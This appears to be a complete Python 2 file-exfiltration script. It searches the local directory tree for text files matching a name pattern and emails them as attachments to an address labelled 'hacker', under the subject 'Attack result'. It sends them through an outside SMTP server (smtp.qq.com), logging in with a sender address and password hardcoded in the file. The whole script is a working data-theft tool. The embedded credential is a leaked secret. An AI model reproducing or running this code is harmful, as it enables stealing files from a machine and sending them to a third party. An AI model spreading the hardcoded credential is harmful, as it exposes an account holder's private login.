import smtplib
import os
from email.mime.text import MIMEText
from email.utils import formataddr
from email.mime.multipart import MIMEMultipart

my_sender='1059024691@qq.com'
my_pass ='yxxrfmqfrnlsbeie'
my_user='whuliujin@163.com'

def mail(path):
	ret=True
	try:
		msg = MIMEMultipart()
		msg['From']=formataddr(["server",my_sender]) 
		msg['To']=formataddr(["hacker",my_user])
		msg['Subject']="Attack result"
		if len(path)==0:
			msg.attach(MIMEText("Can't find any files that meet the requirements",'plain','utf-8'))
		else:
			msg.attach(MIMEText("We have found the qualified documents",'plain','utf-8'))
			for i in path:
				i=i.strip('\n')
				print i
				att = MIMEText(open(i, 'rb').read(), 'base64', 'utf-8')
				att["Content-Type"] = 'application/octet-stream'
				att["Content-Disposition"] = 'attachment; filename="result.txt"'
				msg.attach(att)
		server=smtplib.SMTP_SSL("smtp.qq.com", 465) 
		server.login(my_sender, my_pass)
		server.sendmail(my_sender,[my_user,],msg.as_string())  
		server.quit()
	except:
		ret=False	
	return ret
if __name__ == '__main__':
	cmd="find . -name '*liujin*.txt'"
	path=os.popen(cmd).readlines()
	ret=mail(path)
	if ret:
		print("send Success")
	else:
		print("send Failed")